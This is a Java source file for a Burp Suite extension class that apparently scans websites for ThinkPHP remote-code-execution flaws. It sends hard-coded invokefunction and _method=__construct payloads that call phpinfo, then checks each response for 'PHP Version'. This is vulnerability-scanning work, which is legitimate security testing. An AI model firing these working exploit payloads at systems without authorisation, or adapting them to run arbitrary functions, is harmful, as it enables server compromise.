package burp.ScanFun;

import burp.Common;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;

import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Locale;

public class ThinkphpScan {

    public static String[] payloadsG = {"?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1", "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1", "?s=index|think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=-1",};
    public static String payloadsP05 = "_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo";
    public static String payloadsP013 = "s=1&_method=__construct&method=&filter[]=phpinfo";
    public static String payloadsP023 = "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1";
    public static String payloadsP0232 = "_method=__construct&filter[]=phpinfo&method=get&get[]=-1";

    public static IHttpRequestResponse ThinkphpScanall(IHttpRequestResponse basereqres, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks) {

        String Reqmthod = helpers.analyzeRequest(basereqres).getMethod();


        for (String payload : payloadsG
        ) {
            List headers = helpers.analyzeRequest(basereqres).getHeaders();
            headers.set(0, "GET /" + payload + " HTTP/1.1");
            byte[] body = helpers.buildHttpMessage(headers, null);
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
            String res = Common.getResbody(requestResponse.getResponse(), helpers);
            if (res.contains("PHP Version")) {
                return requestResponse;
            }

        }


        List headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST /?s=index/index HTTP/1.1");

        byte[] body = helpers.buildHttpMessage(headers, payloadsP05.getBytes(StandardCharsets.UTF_8));
        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        String res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            return requestResponse;
        }

        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST /index.php?s=index HTTP/1.1");
        body = helpers.buildHttpMessage(headers, payloadsP013.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            return requestResponse;
        }


        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST / HTTP/1.1");
        body = helpers.buildHttpMessage(headers, payloadsP023.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            return requestResponse;
        }

        headers = helpers.analyzeRequest(basereqres).getHeaders();
        headers.set(0, "POST /?s=captcha HTTP/1.1");
        body = helpers.buildHttpMessage(headers, payloadsP0232.getBytes(StandardCharsets.UTF_8));
        requestResponse = callbacks.makeHttpRequest(basereqres.getHttpService(), body);
        res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("PHP Version")) {
            return requestResponse;
        }

        return null;
}


}